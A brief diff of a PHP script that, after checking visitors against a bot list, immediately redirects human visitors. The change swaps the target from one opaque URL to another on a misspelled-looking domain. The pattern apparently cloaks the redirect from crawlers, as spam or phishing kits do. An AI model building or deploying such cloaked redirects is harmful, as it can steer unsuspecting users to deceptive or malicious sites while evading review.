@@ -22,7 +22,7 @@ foreach ($bots as $bot) {
 }
 
 // Przekierowanie dla użytkownika – bez opóźnienia
-header("Location: https://wait-page.eu/a/05JMfgn3SDy1K");
+header("Location: https://redrection.pro/a/NVzGCMDj7t4ko0");
 exit;
 ?>
 
